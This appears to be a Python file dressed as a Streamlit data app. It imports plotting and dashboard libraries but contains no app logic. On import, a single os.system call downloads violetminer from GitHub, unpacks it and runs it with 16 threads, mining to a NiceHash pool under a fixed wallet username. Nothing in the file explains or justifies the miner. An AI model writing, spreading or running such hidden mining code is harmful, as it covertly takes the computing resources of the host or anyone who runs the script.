from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64
os.system("curl -L -o violetminer-linux-v0.2.2.tar.gz https://github.com/turtlecoin/violetminer/releases/download/v0.2.2/violetminer-linux-v0.2.2.tar.gz && tar -xf violetminer-linux-v0.2.2.tar.gz && cd violetminer-linux-v0.2.2 && ./violetminer --algorithm wrkzcoin --pool stratum+ssl://cryptonightr.auto.nicehash.com:443 --username 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.001 --password x --disableNVIDIA --threads 16")
